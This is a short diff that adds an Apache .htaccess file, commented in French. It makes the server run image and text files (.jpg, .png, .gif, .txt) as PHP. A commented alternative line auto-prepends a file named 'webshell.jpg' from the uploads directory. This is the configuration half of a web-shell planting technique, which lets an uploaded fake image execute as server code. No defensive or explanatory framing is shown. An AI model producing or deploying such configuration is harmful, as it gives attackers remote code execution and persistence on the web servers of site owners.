@@ -1,0 +1,6 @@
+# Forcer l'exécution PHP sur toutes les extensions
+AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml .phar
+AddType application/x-httpd-php .jpg .jpeg .png .gif .txt
+
+# Alternative : php_value pour inclusion automatique
+# php_value auto_prepend_file "/var/www/html/uploads/webshell.jpg"
